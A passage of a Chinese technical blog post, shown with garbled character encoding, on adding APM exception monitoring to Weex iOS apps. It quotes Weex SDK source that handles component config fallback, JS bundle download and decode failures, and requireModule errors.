    staticStyle<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      width<span class="hljs-punctuation">:</span> <span class="hljs-string">"400px"</span><span class="hljs-punctuation">,</span>
      height<span class="hljs-punctuation">:</span> <span class="hljs-string">"40px"</span><span class="hljs-punctuation">,</span>
      marginBottom<span class="hljs-punctuation">:</span> <span class="hljs-string">"20px"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    attrs<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ç‚¹å‡»è®¡ç®—10+20"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"bgColor"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#FF6600"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"hello"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    on<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"click"</span><span class="hljs-punctuation">:</span> _vm.handleButtonClick
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-comment">// å¦‚æœæœ‰ children å°±æ˜¯ children ä¿¡æ¯</span>
)
</code></pre>
<p>åœ¨ App è¿è¡Œé˜¶æ®µï¼ŒWeex çš„ JS å¼•æ“ï¼ˆiOS ç«¯ä¸º JSCoreã€Android ç«¯ä¸º V8ï¼‰åŠ è½½ JS Bundle åï¼Œæ‰§è¡Œç»„ä»¶çš„renderå‡½æ•°ï¼Œé€šè¿‡è°ƒç”¨ <code>_h</code> å‡½æ•°å°†æ¨¡æ¿æè¿°è½¬æ¢ä¸ºè·¨å¹³å°çš„è™šæ‹Ÿ DOMï¼ˆVNodeï¼‰ï¼ŒVNode ä¼šè¢«åºåˆ—åŒ–ä¸º JSON æ ¼å¼ï¼Œæœ€ç»ˆé€šè¿‡ JS Bridge ä¼ é€’ç»™ Native ç«¯ï¼ˆiOS/Androidï¼‰ç”¨äºåŸç”Ÿè§†å›¾æ¸²æŸ“ã€‚</p>
<p>Weex çš„ Component ç›¸å…³é€»è¾‘éƒ½ç”± <code>WXComponentManager</code> è´Ÿè´£ã€‚é¡µé¢åœ¨æ„å»ºå±•ç¤ºçš„æ—¶å€™ï¼Œä¼šè°ƒç”¨ <code>_buildComponent</code> æ–¹æ³•ï¼Œå…¶å†…éƒ¨ä¼šè°ƒç”¨ WXComponentFactory çš„èƒ½åŠ›ï¼ˆ<code>configWithComponentName</code>ï¼‰ï¼Œæ ¹æ® ComponentName è·å– Componentã€‚</p>
<p><code>configWithComponentName</code> æ˜¯ Weex iOS ä¾§ WXComponentFactoryï¼ˆç»„ä»¶å·¥å‚ç±»ï¼‰çš„æ ¸å¿ƒæ–¹æ³•ä¹‹ä¸€ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯ï¼šæ ¹æ®ä¼ å…¥çš„ç»„ä»¶åç§°ï¼ˆå¦‚ color-button/div/textï¼‰ï¼ŒæŸ¥æ‰¾è¯¥ç»„ä»¶å¯¹åº”çš„ Native ä¾§é…ç½®ï¼ˆWXComponentConfigï¼‰ï¼›è‹¥æ‰¾ä¸åˆ°å¯¹åº”é…ç½®ï¼Œåˆ™é™çº§ä½¿ç”¨åŸºç¡€å®¹å™¨ç»„ä»¶ div çš„é»˜è®¤é…ç½®ï¼Œå¹¶è¾“å‡ºè­¦å‘Šæ—¥å¿—ã€‚</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">- (WXComponentConfig *)configWithComponentName:(NSString *)name
{
    WXAssert(name, @"Can not find config for a nil component name");
    
    WXComponentConfig *config = nil;
    
    [_configLock lock];
    config = [_componentConfigs objectForKey:name];
    if (!config) {
        WXLogWarning(@"No component config for name:%@, use default config", name);
        config = [_componentConfigs objectForKey:@"div"];
    }
    [_configLock unlock];
    
    return config;
}
</code></pre>
<p>UI Component åšçš„æ¯”è¾ƒéšæ„ï¼Œè®¤ä¸ºæ˜¾ç¤ºé—®é¢˜é™çº§ç”¨ div å°±å¯ä»¥äº†ã€‚åšä¸º SDK è¿™ä¹ˆè®¾è®¡ä¹Ÿä¼¼ä¹å¯ä»¥æ¥å—ï¼Œä½†ä½œä¸ºä¸šåŠ¡æ–¹ï¼Œæˆ‘ä»¬å¿…é¡»æ”¶é›†ç»Ÿè®¡è¿™ç§å¼‚å¸¸æƒ…å†µã€‚
æ‰€ä»¥æ­¤å¤„æˆ‘ä»¬å¯ä»¥æ”¶é›†æ¡ˆå‘ç°åœºæ•°æ®ï¼Œè¿›è¡Œä¸ŠæŠ¥ã€‚æˆ‘ä»¬å‘ç° Weex è‡ªå·±å°è£…äº† <code>WXExceptionUtils</code>ç±»ï¼Œæš´éœ²äº† <code>commitCriticalExceptionRT</code> æ¥å£ï¼Œç”¨äºæ”¶é›†è‡´å‘½é—®é¢˜ã€‚</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">+ (void)commitCriticalExceptionRT:(WXJSExceptionInfo *)jsExceptionInfo{
    
    WXPerformBlockOnComponentThread(^ {
        id&lt;WXJSExceptionProtocol&gt; jsExceptionHandler = [WXHandlerFactory handlerForProtocol:@protocol(WXJSExceptionProtocol)];
        if ([jsExceptionHandler respondsToSelector:@selector(onJSException:)]) {
            [jsExceptionHandler onJSException:jsExceptionInfo];
        }
        if ([WXAnalyzerCenter isOpen]) {
            [WXAnalyzerCenter transErrorInfo:jsExceptionInfo];
        }
    });
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ä¼šåˆ¤æ–­æ˜¯å¦å­˜åœ¨å¯ä»¥å¤„ç† exception éµå¾ª WXJSExceptionProtocol çš„ handlerã€‚æ‰€ä»¥æˆ‘ä»¬æ–°å¢ä¸€ä¸ª <code>WXExceptionReporter</code> ç±»ï¼ˆéµå¾ª WXJSExceptionProtocol åè®®ï¼‰ï¼Œç”¨äºæ”¶é›†å¼‚å¸¸ï¼Œç„¶åç”¨äºç»Ÿä¸€çš„ä¸ŠæŠ¥ï¼Œå†…éƒ¨æä¾›åŸºç¡€æ•°æ®çš„ç»„è£…ã€å­—æ®µè§£æåŠŸèƒ½ã€‚</p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad9fc6690769433e8cefadb6cfb52f17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=D%2FyuvCXgWZug8Q8IzvqDBppj2dg%3D" alt="WeexComponentBuildFlow.png" loading="lazy"/></p>
<h4 data-id="heading-69">2. å…¨éƒ¨ç™½å±</h4>
<p>æ ¹æ® Weex çš„å·¥ä½œåŸç†å¯ä»¥çŸ¥é“ï¼Œé¡µé¢éœ€è¦å±•ç¤ºè‚¯å®šè¦æ ¹æ® url å»è·å– JS Bundle å†…å®¹ï¼Œç„¶åè§£ææˆ VNode æœ€åé€šè¿‡ JSBridge å»è°ƒç”¨ Native çš„ UI Component å»å±•ç¤º UIï¼Œé‚£ä¹ˆæ•´ä¸ªæµç¨‹å‡ ä¸ªé‡è¦çš„ç¯èŠ‚éƒ½å¯èƒ½å‡ºé”™ï¼Œå¯¼è‡´é¡µé¢ç™½å±ã€‚</p>
<h5 data-id="heading-70">1. èµ„æºè¯·æ±‚å¤±è´¥</h5>
<p>JS Bundle èµ„æºè¯·æ±‚å¤±è´¥ï¼Œå­˜åœ¨ Errorï¼Œæ­¤æ—¶æ˜¯æ— æ³•å»å±•ç¤º Weex é¡µé¢çš„ã€‚è¿™ç§æƒ…å†µå°±æ˜¯ HTTP çŠ¶æ€ç é200çš„æƒ…å†µã€‚</p>
<p>æ¯ä¸ª Weex é¡µé¢éƒ½ç”± WXSDKInstance è´Ÿè´£ä¸‹è½½ JS Bundle èµ„æºï¼Œæ‰€ä»¥ä¸‹è½½çš„é€»è¾‘åœ¨ WXSDKInstance é‡Œã€‚</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">- (void)_renderWithRequest:(WXResourceRequest *)request options:(NSDictionary *)options data:(id)data; 
{
  _mainBundleLoader.onFinished = ^(WXResourceResponse *response, NSData *data) {

      NSError *error = nil;
      if ([response isKindOfClass:[NSHTTPURLResponse class]] &amp;&amp; ((NSHTTPURLResponse *)response).statusCode != 200) {
          error = [NSError errorWithDomain:WX_ERROR_DOMAIN
                                      code:((NSHTTPURLResponse *)response).statusCode
                                  userInfo:@{@"message":@"status code error."}];
          if (strongSelf.onFailed) {
              strongSelf.onFailed(error);
          }
      }
      
      if (error) {
          [WXExceptionUtils commitCriticalExceptionRT:strongSelf.instanceId
                                              errCode:[NSString stringWithFormat:@"%d", WX_KEY_EXCEPTION_JS_DOWNLOAD]
                                              function:@"_renderWithRequest:options:data:"
                                            exception:[NSString stringWithFormat:@"download bundle error :%@",[error localizedDescription]]
                                            extParams:nil];
          return;
      }

      if (!data) {
          NSString *errorMessage = [NSString stringWithFormat:@"Request to %@ With no data return", request.URL];
          WX_MONITOR_FAIL_ON_PAGE(WXMTJSDownload, WX_ERR_JSBUNDLE_DOWNLOAD, errorMessage, strongSelf.pageName);
          [WXExceptionUtils commitCriticalExceptionRT:strongSelf.instanceId
                                              errCode:[NSString stringWithFormat:@"%d", WX_KEY_EXCEPTION_JS_DOWNLOAD]
                                              function:@"_renderWithRequest:options:data:"
                                            exception:errorMessage
                                            extParams:nil];
          return;
      }
  };
}
</code></pre>
<p>æ¨¡æ‹Ÿ JS Bundle ä¸‹è½½é”™è¯¯ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8127cf21938140c0ae40a15a9a5a26b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=r0g86JWgUX33NF7lfv3iwvOb%2B7E%3D" alt="WeexJSBundleDownloadFailed.png" loading="lazy"/></p>
<p>ä¸‹è½½ JS Bundle ç½‘ç»œè¯·æ±‚å®Œæˆåï¼Œå¦‚æœå‡ºç° Errorï¼Œåˆ™ä¼šè°ƒç”¨ WXExceptionUtils çš„èƒ½åŠ›ï¼Œå°†å¼‚å¸¸äº¤ç»™ <code>WXExceptionReporter</code> å»å¤„ç†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f045d0177a8483b857901ad7520f993~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=RuNioiYspuc%2FThdWHk3%2BOyOUpZE%3D" alt="WeexJSBundleDownloadFailedAPM.png" loading="lazy"/></p>
<h5 data-id="heading-71">2. èµ„æºè¯·æ±‚æˆåŠŸï¼Œæ•°æ®ä¸ºç©º</h5>
<p>è¿˜æœ‰ä¸€ç§æƒ…å†µå°±æ˜¯ï¼š**JSBundle ä¸‹è½½è¯·æ±‚åœ¨ HTTP å±‚é¢ â€œæˆåŠŸå®Œæˆâ€ï¼ˆçŠ¶æ€ç  200ï¼‰ï¼Œä½†è¿”å›çš„äºŒè¿›åˆ¶æ•°æ® data ä¸º nil æˆ–ç©ºï¼ˆé•¿åº¦ä¸º 0ï¼‰ **</p>
<p>å¯èƒ½ä½ ä¼šå¥½å¥‡ï¼Œæ€ä¹ˆå¯èƒ½æœ‰ç©ºçš„ JSBundleï¼Œä»€ä¹ˆåœºæ™¯ä¸‹ä¼šäº§ç”Ÿè¿™ç§æƒ…å†µï¼Ÿ
å‡¡æ˜¯æ­£å¸¸å†™ä»£ç éƒ½ç¬¦åˆé¢„æœŸå°±æ²¡æœ‰ä»»ä½• bug å’Œæ•…éšœäº†ï¼Œæ‰€ä»¥åˆ©ç”¨æ‚²è§‚ç­–ç•¥ï¼Œå°†å„ç§å¯èƒ½å‡ºç°é—®é¢˜çš„åœ°æ–¹éƒ½ç›‘æ§åˆ°ï¼Œå› ä¸ºåªè¦ JSBundle ä¸ºç©ºï¼Œé¡µé¢è‚¯å®šæ˜¯ç™½å±ï¼Œå¯¹äºç”¨æˆ·ä¾§æ¥è¯´éƒ½æ˜¯è‡´å‘½çš„ã€‚</p>
<ol>
<li>æœåŠ¡å™¨/CDN è¿”å›â€œç©ºå“åº”â€ï¼šåç«¯ / CDN é…ç½®å¼‚å¸¸ï¼šè¯·æ±‚çš„ JSBundle URL æœ‰æ•ˆï¼ŒHTTP çŠ¶æ€ç è¿”å› 200ï¼Œä½†å“åº”ä½“ï¼ˆBodyï¼‰ä¸ºç©ºï¼ˆæ¯”å¦‚é™æ€ JS æ–‡ä»¶è¢«åˆ é™¤ã€CDN ç¼“å­˜å¤±æ•ˆä¸”æºç«™æ— æ•°æ®ã€åç«¯æ¥å£é€»è¾‘é”™è¯¯æœªå†™å…¥å“åº”å†…å®¹ï¼‰ï¼›</li>
<li>ä¸‹è½½è¿‡ç¨‹ä¸­æ•°æ®ä¼ è¾“æˆªæ–­ / ä¸¢å¤±</li>
</ol>
<ul>
<li>ç½‘ç»œæ³¢åŠ¨ï¼šä¸‹è½½è¯·æ±‚å·²æ”¶åˆ°æœåŠ¡å™¨çš„ â€œå“åº”å®Œæˆâ€ ä¿¡å·ï¼Œä½†æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­å› ç½‘ç»œä¸­æ–­ã€è¶…æ—¶ç­‰å¯¼è‡´ NSData æœªå®Œæ•´æ¥æ”¶ï¼ˆä»… HTTP å¤´æˆåŠŸæ¥æ”¶ï¼Œä½“æ•°æ®ä¸ºç©ºï¼‰ï¼›</li>
<li>Weex åŠ è½½å™¨ï¼ˆmainBundleLoaderï¼‰å¼‚å¸¸ï¼šåŠ è½½å™¨åœ¨å°†å“åº”æ•°æ®è½¬ä¸º NSData æ—¶å‡ºç°åº•å±‚é”™è¯¯ï¼ˆå¦‚å†…å­˜ä¸è¶³ã€æ•°æ®è§£ç å¤±è´¥ï¼‰ï¼Œå¯¼è‡´ data è¢«ç½®ä¸º nilã€‚</li>
</ul>
<p>Mockï¼šå°† data è®¾ä¸º nilã€‚æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f7346ccdc0574cba97a9bd195bebbbd6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=3QAb3CTSFZfYP99pqlhWGR3V7mI%3D" alt="WeexJSBundleParseFailed.png" loading="lazy"/></p>
<p>å¯ä»¥çœ‹åˆ° Weex ä¹Ÿä¼šæŠŠè¿™ç§é”™è¯¯è¿›è¡Œæ”¶é›†ï¼Œè°ƒç”¨ <code>WXExceptionUtils commitCriticalExceptionRT</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬æ·»åŠ çš„ Analyzer æ˜¯å¯ä»¥ç›‘æ§åˆ°è¿™ç§å¼‚å¸¸çš„ã€‚
æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03d2c52a165c4844a7a264724a02f71a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=dZM6FItKQRExX0qKh0VNp53gcl0%3D" alt="WeexJSBundleParseErrorAPM.png" loading="lazy"/></p>
<h5 data-id="heading-72">3. èµ„æºè¯·æ±‚æˆåŠŸï¼Œæ•°æ®æ— æ³•è§£æ</h5>
<p>è¿˜æœ‰ä¸€ç§ç‰¹æ®Šçš„æƒ…å†µå°±æ˜¯ï¼š<strong>ä¸‹è½½çš„ JSBundle äºŒè¿›åˆ¶æ•°æ®è™½éç©ºï¼Œä½†å› æ— æ³•ä»¥ UTF-8 ç¼–ç è§£ç ä¸ºå­—ç¬¦ä¸²ï¼Œå¯¼è‡´ Weex å®ä¾‹æ— æ³•åŠ è½½æ‰§è¡Œè¯¥æ•°æ®ï¼Œæœ€ç»ˆé¡µé¢ UI æ— æ³•æ­£å¸¸å±•ç¤º</strong>ã€‚æ¯”å¦‚ä¸‹é¢çš„æƒ…å†µï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6fdbef3fa6549fea8ba93b5ab23f467~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=QQ5sLB64xvhg92mNApfF6SljymI%3D" alt="WeexJSbundleEncodingError.png" loading="lazy"/></p>
<p>å’Œä¸Šé¢çš„æƒ…å†µç±»ä¼¼ï¼Œè¿™ç§éƒ½å±äºæ¦‚ç‡è¾ƒå°çš„é—®é¢˜ï¼Œä½†ä¹Ÿè¦ç›‘æ§å’Œé¢„é˜²ã€‚</p>
<p>ä¸€äº›å¯èƒ½çš„æƒ…å†µï¼š</p>
<ol>
<li>JSBundle æ–‡ä»¶ç¼–ç é UTF-8ã€‚ <strong>Weex è¦æ±‚ï¼šJS Bundle æ–‡ä»¶å¿…é¡»é‡‡ç”¨ UTF-8 ç¼–ç ï¼ˆæ—  BOMï¼‰ä»¥ä¿è¯è·¨å¹³å°å…¼å®¹æ€§ï¼Œé UTF-8 ç¼–ç ï¼ˆå¦‚ GBKã€UTF-16ï¼‰å¯èƒ½å¯¼è‡´ iOS/Android å¹³å°è§£æå¤±è´¥</strong></li>
<li>æ•°æ®æŸå/åŒ…å«éæ³• UTF-8 å­—èŠ‚</li>
</ol>
<ul>
<li>ä¸‹è½½æˆªæ–­ï¼šUTF-8 æ˜¯ã€Œå¤šå­—èŠ‚ç¼–ç ã€ï¼ˆæ¯”å¦‚ä¸­æ–‡å  3 å­—èŠ‚ï¼‰ï¼Œè‹¥ä¸‹è½½è¿‡ç¨‹ä¸­æ•°æ®æœ«å°¾çš„å­—ç¬¦å­—èŠ‚ä¸å®Œæ•´ï¼ˆå¦‚åªä¸‹äº† 2 å­—èŠ‚ï¼‰ï¼Œè§£ç æ—¶ä¼šå›  â€œå­—èŠ‚åºåˆ—ä¸åˆæ³•â€ å¤±è´¥ï¼›</li>
<li>æ•°æ®ç¯¡æ”¹ï¼šCDN / ç½‘å…³ / ä»£ç†åœ¨ä¼ è¾“ä¸­æ··å…¥é UTF-8 å­—èŠ‚ï¼ˆå¦‚ 0xFFã€0xFEã€0x00 ç­‰æ— æ•ˆå­—èŠ‚ï¼‰ï¼Œç ´åç¼–ç ç»“æ„ï¼›</li>
<li>æ–‡ä»¶æŸåï¼šJSBundle æ–‡ä»¶æ‰“åŒ… / ä¸Šä¼ æ—¶å‡ºé”™ï¼ˆå¦‚å‹ç¼©åæœªæ­£ç¡®è§£å‹ï¼‰ï¼ŒåŒ…å«ä¹±ç  / äºŒè¿›åˆ¶ç¢ç‰‡</li>
</ul>
<ol start="3">
<li>è¯·æ±‚åˆ°éæ–‡æœ¬æ•°æ®ï¼ˆURL é”™è¯¯ï¼‰ã€‚è¯·æ±‚çš„ JS Bundle è¿”å›çš„ä¸æ˜¯ JS æ–‡æœ¬ï¼Œè€Œæ˜¯äºŒè¿›åˆ¶ï¼š</li>
</ol>
<ul>
<li>URL é…ç½®é”™è¯¯ï¼šæŒ‡å‘å›¾ç‰‡ï¼ˆpng/jpgï¼‰ã€å‹ç¼©åŒ…ï¼ˆzipï¼‰ã€äºŒè¿›åˆ¶åè®®æ•°æ®ï¼ˆå¦‚ protobufï¼‰ã€å¯æ‰§è¡Œæ–‡ä»¶ç­‰</li>
<li>åç«¯æ¥å£é”™è¯¯ï¼šåŸæœ¬åº”è¿”å› JS æ–‡æœ¬çš„æ¥å£ï¼Œå¼‚å¸¸æ—¶è¿”å›äºŒè¿›åˆ¶æ ¼å¼çš„é”™è¯¯ä¿¡æ¯ï¼ˆè€Œéæ–‡æœ¬é”™è¯¯ï¼‰</li>
<li>ç¼“å­˜æ±¡æŸ“ï¼šWeex æœ¬åœ°ç¼“å­˜çš„ JSBundle è¢«å…¶ä»–äºŒè¿›åˆ¶æ–‡ä»¶è¦†ç›–ï¼ˆå¦‚ç¼“å­˜è·¯å¾„å†²çªï¼‰</li>
</ul>
<ol start="4">
<li>ç‰¹æ®Šå­—ç¬¦/ç¼–ç æº¢å‡º</li>
</ol>
<ul>
<li>JSBundle ä¸­åŒ…å« UTF-8 æ— æ³•è¡¨ç¤ºçš„ã€Œæ— æ•ˆ Unicode ç ç‚¹ã€ï¼ˆå¦‚è¶…å‡º U+10FFFF èŒƒå›´ï¼Œæˆ–ä¿ç•™çš„æœªå®šä¹‰ç ç‚¹ï¼‰</li>
<li>æ•°æ®é‡è¿‡å¤§ï¼šæå¤§å‹ JSBundle è§£ç æ—¶å› å†…å­˜ä¸è¶³ / ç³»ç»Ÿé™åˆ¶ï¼Œå¯¼è‡´è§£ç æ¥å£è¿”å› nilï¼ˆiOS ä¸­ NSString å¯¹å•å­—ç¬¦ä¸²é•¿åº¦æœ‰éšæ€§é™åˆ¶ï¼‰</li>
</ul>
<p>è¿™ç§æƒ…å†µï¼ŒWeex å®˜æ–¹æ˜¯æ€ä¹ˆåšçš„ï¼Ÿ</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">NSString *jsBundleString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
if (!jsBundleString) {
    WX_MONITOR_FAIL_ON_PAGE(WXMTJSDownload, WX_ERR_JSBUNDLE_STRING_CONVERT, @"data converting to string failed.", strongSelf.pageName)
    [strongSelf.apmInstance setProperty:KEY_PROPERTIES_ERROR_CODE withValue:[@(WX_ERR_JSBUNDLE_STRING_CONVERT) stringValue]];
    return;
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™ç§æƒ…å†µæ²¡æœ‰è¢« Weex æ²¡æœ‰è§†ä¸ºâ€œè‡´å‘½é—®é¢˜â€è¿›è¡Œä¸ŠæŠ¥ã€‚åªæ˜¯è¿›è¡Œäº†ç®€å•æ‰“å°ã€‚å°è¯•ç«™åœ¨æ¡†æ¶è§’åº¦æƒ³é—®é¢˜ï¼Œä» SDK Owner è§’åº¦å½’å› ï¼š</p>
<ul>
<li>HTTP çŠ¶æ€ç é”™è¯¯/æ— æ•°æ®ï¼šWeex è®¤ä¸ºè¿™ç±»é”™è¯¯æ˜¯ã€Œå¤–éƒ¨ä¸å¯æ§æ•…éšœã€ï¼ˆç½‘ç»œã€CDNã€æœåŠ¡ç«¯å®•æœºï¼‰ï¼Œä¼šå½±å“å¤§æ‰¹é‡å®ä¾‹ï¼Œå±äº â€œæ¡†æ¶çº§è‡´å‘½å¼‚å¸¸â€ï¼Œå¿…é¡»é€šè¿‡ WXExceptionUtils ä¸ŠæŠ¥ï¼ˆè§¦å‘å…¨å±€å¼‚å¸¸ç»Ÿè®¡ã€å‘Šè­¦ï¼‰</li>
<li>ç¼–ç è½¬æ¢å¤±è´¥ï¼šå¯èƒ½æ˜¯åˆ†æ‰¹å¤šæ¬¡æ‰“åŒ…ï¼Œå‰å‡ æ¬¡éƒ½æ˜¯ UTF-8 æ ¼å¼ï¼Œåªæ˜¯è¿™æ¬¡ç¼–ç é”™è¯¯ï¼Œæ˜¯å¯ä»¥å®šä½çš„ã€‚Weex è®¤ä¸ºè¿™ç±»é”™è¯¯æ˜¯ã€Œå†…éƒ¨å¯æ§é—®é¢˜ã€ï¼ˆå‰ç«¯æ‰“åŒ…æ—¶æœªæŒ‰ UTF-8 è§„èŒƒè¾“å‡ºã€URL é…ç½®é”™è¯¯æŒ‡å‘äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ï¼Œå±äº â€œä¸šåŠ¡ä¾§é”™è¯¯â€ï¼Œæ¡†æ¶åªéœ€è®°å½•ç›‘æ§ï¼ˆæé†’å¼€å‘è€…ä¿®å¤ï¼‰ï¼Œæ— éœ€å‡çº§ä¸º â€œæ¡†æ¶çº§è‡´å‘½å¼‚å¸¸â€ã€‚</li>
</ul>
<p>ä½†ä»ä¸šåŠ¡æ–¹è§’åº¦å‡ºå‘ï¼Œä¸å…‰é¡µé¢æ˜¯ Weexã€Nativeã€Flutterã€H5ï¼Œåªè¦æ˜¯å½±å“äº†ç”¨æˆ·ä½“éªŒï¼Œéƒ½å±äºè‡´å‘½é—®é¢˜ï¼Œå°¤å…¶è¿™ç§æ•´ä¸ªé¡µé¢éƒ½æ˜¯ç™½å±çš„æƒ…å†µã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹æºç ï¼Œå»ä¸ŠæŠ¥è‡´å‘½å¼‚å¸¸ã€‚è°ƒç”¨ <code>WXExceptionUtils commitCriticalExceptionRT</code> çš„èƒ½åŠ›ã€‚</p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2154e2845b9049a0be6451bfb74e380e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=3BwQrPAEiMiQArQhfy%2FCp2TsDg0%3D" alt="WeexJSBundleEncodingAPM.png" loading="lazy"/></p>
<h3 data-id="heading-73">4. é€»è¾‘å¼‚å¸¸</h3>
<h4 data-id="heading-74">1. JS ä¾§ require Module å¤±è´¥</h4>
<p>åœ¨ Native <code>[WXSDKEngine registerModule:@"logicCalculation" withClass:[WXLogicCalculationModule class]]</code> æ­£å¸¸æ³¨å†Œçš„ Moduleï¼Œåå­—å« <code>logicCalculation</code>ã€‚åœ¨ js ä¾§ä½¿ç”¨çš„æ—¶å€™ä¸å°å¿ƒå†™æˆ <code>const logicCalculation = weex.requireModule('logicCalculation1')</code>ï¼Œæµ‹è¯•åˆæ²¡å›å½’åˆ°ï¼Œé—®é¢˜é€ƒé€¸åˆ°çº¿ä¸Šï¼Œå¯èƒ½å°±æ˜¯é€»è¾‘é—®é¢˜ã€‚Weex å®˜æ–¹çš„åšæ³•å°±æ˜¯åœ¨ Xcode æ‰“å° logã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23cb98cbb5e049c3acc196b1c116b623~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=l7HXLokeuQyH909ZpVlNHoO1GiM%3D" alt="WeexModuleRequireError.png" loading="lazy"/></p>
<p>æ‰€ä»¥ä½œä¸º APM ä¾§ï¼Œæˆ‘ä»¬è¦å®šä½å’Œæ”¶é›†åˆ°è¯¥é—®é¢˜ï¼Œè¿›è¡Œé—®é¢˜ä¸ŠæŠ¥ã€‚</p>
<p>æƒ³åŠæ³•çŸ¥é“å“ªé‡ŒæŠ¥é”™ï¼ŒrequireModule ä¸æ˜¯åŸç”Ÿå†™æ³•ï¼Œè¿™è‚¯å®šæ˜¯ JS ä¾§å°è£…çš„ï¼ŒæŸ¥çœ‹ Weex æºç </p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1c8b35c5beb4958b0d1c0af4513e905~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=GNJIzZRV5ymObWuqAm1zU15ZEuM%3D" alt="WeexRequireModuleError.png" loading="lazy"/></p>
<pre><code class="hljs language-JS" lang="JS"><span class="hljs-comment">// Weex JS Framework æ ¸å¿ƒæºç ï¼ˆç®€åŒ–ï¼‰</span>
<span class="hljs-title class_">WeexInstance</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">requireModule</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">requireModule</span>(<span class="hljs-params">moduleName</span>) {
  <span class="hljs-comment">// 1. åŸºç¡€æ ¡éªŒï¼šWeexå®ä¾‹æ˜¯å¦æœ‰æ•ˆï¼ˆæ¯”å¦‚æ˜¯å¦å·²é”€æ¯ï¼‰</span>
  <span class="hljs-keyword">var</span> id = <span class="hljs-title function_">getId</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// è·å–å½“å‰Weexå®ä¾‹ID</span>
  <span class="hljs-keyword">if</span> (!(id &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">document</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">document</span>.<span class="hljs-property">taskCenter</span>)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"[JS Framework] Failed to requireModule(\""</span> + moduleName + <span class="hljs-string">"\"), instance doesn't exist."</span>);
    <span class="hljs-keyword">return</span>;
  }

